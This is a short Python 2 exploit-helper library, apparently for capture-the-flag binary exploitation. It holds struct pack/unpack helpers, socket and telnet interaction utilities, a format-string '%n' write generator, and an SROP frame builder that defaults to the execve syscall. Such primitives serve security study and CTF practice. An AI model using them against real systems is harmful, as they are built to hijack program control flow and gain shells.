import struct
import socket
import telnetlib

#pack
def pack32(data,fmt="<I"):
    return struct.pack(fmt,data)

def unpack32(data,fmt="<I"):
    return struct.unpack(fmt,data)[0]

def pack(data,fmt="<Q"):
    return struct.pack(fmt,data)

def unpack(data,fmt="<Q"):
    return struct.unpack(fmt,data)[0]

#Connection
def make_conn(host,port):
    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    sock.connect((host,port))
    return sock

def recvuntil(sock,delim = '\n') :
    data = ""
    while not data.endswith(delim):
        data += sock.recv(1)
    return data

def sendline(sock,data):
    sock.send(data + '\n')
    return 1

def inter(sock):
    t = telnetlib.Telnet()
    t.sock = sock
    t.interact()

#fmt
def fmtchar(prev_word,word,index,byte = 1):
    fmt = ""
    if word - prev_word > 0 :
        result = word - prev_word 
        fmt += "%" + str(result) + "c"
    elif word == prev_word :
        result = 0
    else :
        result = 256 - prev_word + word
        fmt += "%" + str(result) + "c"
    if byte == 2 :
        fmt += "%" + str(index) + "$hn"
    elif byte == 4 :
        fmt += "%" + str(index) + "$n"
    else :
        fmt += "%" + str(index) + "$hhn"
    return fmt

#srop x86_64
def srop(sigret,rip,rbp,rsp,rdi = 0,rsi = 0,rax = 0x3b ,rbx = 0,rcx = 0,rdx = 0):
    uc_flags,uc_link,ss_sp,ss_flags,ss_size = [0,0,0,0,0]
    r8,r9,r10,r11,r12,r13,r14,r15 = [0,0,0,0,0,0,0,0]
    eflags = 0x246
    cs,fs,gs,pad = [0x33,0,0,0]
    selector = cs + (fs << 8*2) + (gs << 8*4) + (pad << 8*6)
    [err,trapno,oldmask,cr2,fpstate] = [0,0,0,0,0]
    ucontext = ""
    ucontext += pack(sigret)
    ucontext += pack(uc_flags)
    ucontext += pack(uc_link)
    ucontext += pack(ss_sp)
    ucontext += pack(ss_flags)   
    ucontext += pack(ss_size)    
    ucontext += pack(r8)    
    ucontext += pack(r9)    
    ucontext += pack(r10)    
    ucontext += pack(r11)    
    ucontext += pack(r12)    
    ucontext += pack(r13)    
    ucontext += pack(r14)    
    ucontext += pack(r15)    
    ucontext += pack(rdi)    
    ucontext += pack(rsi)    
    ucontext += pack(rbp)    
    ucontext += pack(rbx)    
    ucontext += pack(rdx)    
    ucontext += pack(rax)    
    ucontext += pack(rcx)    
    ucontext += pack(rsp)    
    ucontext += pack(rip)
    ucontext += pack(eflags)
    ucontext += pack(selector)
    ucontext += pack(err)
    ucontext += pack(trapno)
    ucontext += pack(oldmask)
    ucontext += pack(cr2)
    return ucontext
    